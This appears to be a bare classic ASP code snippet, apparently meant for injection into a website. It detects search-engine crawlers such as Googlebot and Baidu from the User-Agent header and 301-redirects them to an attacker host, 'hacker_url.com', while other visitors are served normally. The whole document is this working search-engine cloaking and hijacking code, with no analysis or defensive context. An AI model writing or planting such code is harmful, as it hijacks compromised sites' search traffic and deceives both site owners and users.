<%
if isspider() then
    response.Status = "301 Moved Permanently"
    response.AddHeader "Location","http://www.hacker_url.com"
    response.end
end if

function isspider()
    Dim agent, search_engine_array, i
    agent = "agent:"&LCASE(request.servervariables("http_user_agent"))
    search_engine_array = array(
        "googlebot",
        "spider",
        "sogou",
        "yahoo",
        "soso",
        "baidu",
        "360"
    )
    isspider = false
    for i = 0 to ubound(search_engine_array)
        if (instr(agent, search_engine_array(i))) then
            isspider = true
        end if
    next
end function
%>